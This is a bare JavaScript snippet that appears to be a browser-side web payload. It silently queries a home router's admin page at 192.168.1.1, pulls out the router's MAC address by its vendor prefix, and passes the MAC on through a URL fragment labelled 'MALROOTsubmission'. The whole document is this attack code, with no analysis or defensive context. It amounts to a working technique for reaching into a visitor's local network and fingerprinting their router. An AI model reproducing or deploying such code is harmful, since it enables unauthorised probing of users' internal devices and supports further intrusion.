var xmlhttp =  new XMLHttpRequest();
xmlhttp.open('GET', 'http://192.168.1.1/index.cgi?active%5fpage=9124&req%5fmode=0&mimic%5fbutton%5ffield=goto%3a+9124%2e%2e&button%5fvalue=9124', true);
xmlhttp.onreadystatechange = function() {
	if (xmlhttp.readyState == 4 && xmlhttp.status == 200)
	{
		var mac = xmlhttp.responseText.substr(xmlhttp.responseText.indexOf('00:21:63'), 17);
		mac = mac.replace(/:/g, '-');
		document.location = '#MALROOTsubmission?mac=' + mac;
	}
}
xmlhttp.send();
